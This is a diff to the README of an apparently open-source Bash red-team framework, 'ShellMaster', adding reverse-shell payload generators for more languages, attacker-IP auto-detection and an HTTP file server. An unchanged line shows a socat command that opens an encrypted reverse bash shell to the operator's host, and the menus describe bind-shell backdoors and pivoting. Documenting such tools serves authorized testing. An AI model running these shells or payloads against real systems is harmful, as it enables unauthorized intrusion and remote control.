@@ -46,11 +46,12 @@
 ShellMaster is a **controller–module CLI** built entirely in Bash. It wraps standard Unix networking tools (`nc`, `socat`, `openssl`, `ssh`) into an interactive menu-driven interface, enabling operators to:
 
 - Catch and manage reverse/bind shell connections
-- Generate payloads for Bash, PowerShell, and Python
+- Generate payloads for Bash, PowerShell, Python, Perl, Ruby, and PHP
 - Establish SSL/TLS-encrypted shell channels
-- Transfer files securely with integrity verification
+- Transfer files via SCP or a one-command HTTP server
 - Create port-forwarding relays and SSH tunnels
 - Stabilize limited shells into full interactive PTYs
+- Annotate sessions with text notes for report writing
 
 All activity is logged to `logs/framework.log` for audit purposes.
 
@@ -60,13 +61,14 @@ All activity is logged to `logs/framework.log` for audit purposes.
 
 | Module | Capability |
 |--------|------------|
-| **Listeners** | Reverse & bind listeners via `nc`/`ncat`, optional `rlwrap` for history, session tracking |
-| **Payloads** | Bash, PowerShell, Python generators — Base64 encoding, obfuscation, batch generation, save to file |
+| **Startup** | Dependency check on launch — warns immediately if `socat`, `nc`, `python3`, etc. are missing |
+| **Listeners** | Reverse & bind listeners with auto-detected `nc`/`ncat`/`netcat` variant and correct flag handling, optional `rlwrap`, session tracking, session notes |
+| **Payloads** | Bash, PowerShell, Python, Perl, Ruby, PHP generators — auto-detected attacker IP, Base64 encoding, batch generation, save to file |
 | **Encryption** | `socat` SSL/TLS listener, RSA-2048 self-signed cert generation, encrypted payload output |
-| **Transfer** | SCP upload/download, MD5 + SHA256 checksum verification, transfer history |
+| **Transfer** | SCP upload/download, HTTP file server (`python3 -m http.server`), MD5 + SHA256 checksum verification, transfer history |
 | **Relay / Pivot** | `socat` port relay, SSH local / remote / dynamic (SOCKS) tunnels, active relay management |
 | **PTY Upgrade** | Step-by-step guides for Python `pty.spawn`, `script`-based upgrade, environment stabilization |
-| **Logging** | Session IDs, event tracking, append-only JSON log in `logs/` |
+| **Logging** | Session IDs, event tracking, session notes, append-only JSON log in `logs/` |
 
 ---
 
@@ -106,22 +108,24 @@ redteam-shell-framework/
 
 ## 🛠️ Requirements
 
+At startup, ShellMaster checks for all tools and prints a warning for anything that's missing.
+
 ### Required
 
 | Tool | Purpose |
 |------|---------|
 | `bash` 4.0+ | Core runtime |
-| `nc` / `ncat` | Listeners and connections |
-| `socat` | Encrypted listeners and port relays |
-| `openssl` | Certificate generation |
-| `ssh` / `scp` | SSH tunneling and file transfer |
+| `nc` / `ncat` / `netcat` | Listeners and connections (any variant) |
 
-### Optional
+### Optional (feature-specific)
 
-| Tool | Purpose |
-|------|---------|
-| `rlwrap` | Command history and line editing in listeners |
-| `python3` | PTY upgrade via `pty.spawn` |
+| Tool | Purpose | Used by |
+|------|---------|---------|
+| `socat` | Encrypted listeners and port relays | Encryption, Relay |
+| `openssl` | Certificate generation | Encryption |
+| `ssh` / `scp` | SSH tunneling and file transfer | Transfer, Relay |
+| `python3` | HTTP file server, PTY upgrade | Transfer, PTY Upgrade |
+| `rlwrap` | Command history and line editing in listeners | Listeners |
 
 ### Install dependencies — Debian / Ubuntu
 
@@ -221,28 +225,32 @@ The interactive menu will load:
 
 ### 1. Listeners
 
-Start a reverse or bind listener on any port. Optionally wrap with `rlwrap` for command history. Each session is assigned a unique ID and logged to `logs/sessions/`.
+Start a reverse or bind listener on any port. The framework auto-detects which netcat variant is installed (`ncat`, OpenBSD `nc`, or traditional `nc`) and uses the correct flags for each. Optionally wrap with `rlwrap` for command history. Each session is assigned a unique ID and logged to `logs/sessions/`. After a session ends you are prompted to add a note; notes can also be managed from the menu at any time.
 
 ```
 1. Start Reverse Listener   — catches incoming shells on a port
 2. Start Bind Listener      — opens a backdoor that waits for connection
 3. List Active Listeners    — shows active nc/ncat processes
 4. Stop Listener            — kill by PID
-5. Back
+5. Session Notes            — add or view notes on any session
+6. Back
 ```
 
 ### 2. Payload Generator
 
-Generate ready-to-use reverse shell one-liners. Supports Base64 encoding, variable obfuscation, and saving to `payloads/` with metadata.
+Generate ready-to-use reverse shell one-liners. Your local IP is auto-detected and pre-filled — just confirm or override it. Supports Base64 encoding and saving to `payloads/` with metadata.
 
 ```
-1. Bash Reverse Shell
-2. PowerShell Reverse Shell
-3. Python Reverse Shell
-4. One-Liner Templates
-5. View Generated Payloads
-6. Batch Generate (All Types)
-7. Back
+1.  Bash Reverse Shell
+2.  PowerShell Reverse Shell
+3.  Python Reverse Shell
+4.  Perl Reverse Shell
+5.  Ruby Reverse Shell
+6.  PHP Reverse Shell
+7.  One-Liner Templates
+8.  View Generated Payloads
+9.  Batch Generate (All Types)
+10. Back
 ```
 
 ### 3. Encrypted Listener
@@ -263,14 +271,15 @@ socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
 
 ### 4. File Transfer
 
-Upload and download files over SCP. Verify file integrity with MD5 and SHA256 after transfer.
+Upload and download files over SCP, or spin up a quick HTTP server for targets that don't have SSH. Verify file integrity with MD5 and SHA256 after transfer.
 
 ```
-1. Upload File    — local → remote via SCP
-2. Download File  — remote → local via SCP
-3. Verify Checksum — MD5 + SHA256 of any file
-4. View Transfer History
-5. Back
+1. Upload File          — local → remote via SCP
+2. Download File        — remote → local via SCP
+3. Serve Files (HTTP)   — python3 -m http.server with auto-detected IP and copy-paste wget/curl commands
+4. Verify Checksum      — MD5 + SHA256 of any file
+5. View Transfer History
+6. Back
 ```
 
 ### 5. Relay / Pivot
